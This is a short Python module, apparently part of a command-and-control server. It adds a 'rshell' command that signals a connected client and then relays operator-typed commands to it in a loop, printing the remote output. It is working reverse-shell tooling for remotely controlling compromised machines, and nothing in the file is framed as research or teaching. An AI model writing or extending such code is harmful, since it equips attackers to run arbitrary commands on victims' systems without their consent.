# commands/rshell.py
import subprocess
import threading
from Server.console_handler import console_busy

requires_id = True


def execute(conn, args, clients, id):
    global console_busy
    console_busy = True
    conn.sendall(b'RSHELL')
    threading.Thread(target=rshell_thread, args=(conn,), daemon=True).start()


def rshell_thread(conn):
    while True:
        command = input("Enter command for reverse shell: ")
        if command.lower() == 'exit':
            break
        conn.sendall(command.encode())
        results = conn.recv(1024)
        print("Received results: {}".format(results.decode('utf-8')))
